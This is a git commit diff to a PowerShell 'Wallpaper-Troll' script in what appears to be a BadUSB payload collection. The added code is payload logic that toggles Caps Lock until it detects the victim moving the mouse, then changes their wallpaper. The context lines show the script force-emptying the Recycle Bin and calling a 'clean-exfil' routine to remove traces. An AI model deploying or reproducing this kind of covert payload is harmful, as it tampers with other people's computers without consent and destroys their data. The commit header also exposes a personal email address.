22ea22ac5ce5bc82a9c62b4aee565ea4129b8efa
I-Am-Jakoby <Michaelryanchitwood@gmail.com>
2023-01-14 11:06:42 -0600

    Update Wallpaper-Troll.ps1

--- Payloads/Flip-Wallpaper-Troll/Wallpaper-Troll.ps1
+++ Payloads/Flip-Wallpaper-Troll/Wallpaper-Troll.ps1
@@ -405,7 +405,27 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 }
 
 #----------------------------------------------------------------------------------------------------
- 
+
+function Target-Comes {
+Add-Type -AssemblyName System.Windows.Forms
+$originalPOS = [System.Windows.Forms.Cursor]::Position.X
+$o=New-Object -ComObject WScript.Shell
+
+    while (1) {
+        $pauseTime = 3
+        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
+            break
+        }
+        else {
+            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
+        }
+    }
+}
+
+#----------------------------------------------------------------------------------------------------
+
+Target-Comes
+
 Set-WallPaper -Image "$Env:USERPROFILE\Desktop\$ImageName.jpg" -Style Center
 
 clean-exfil
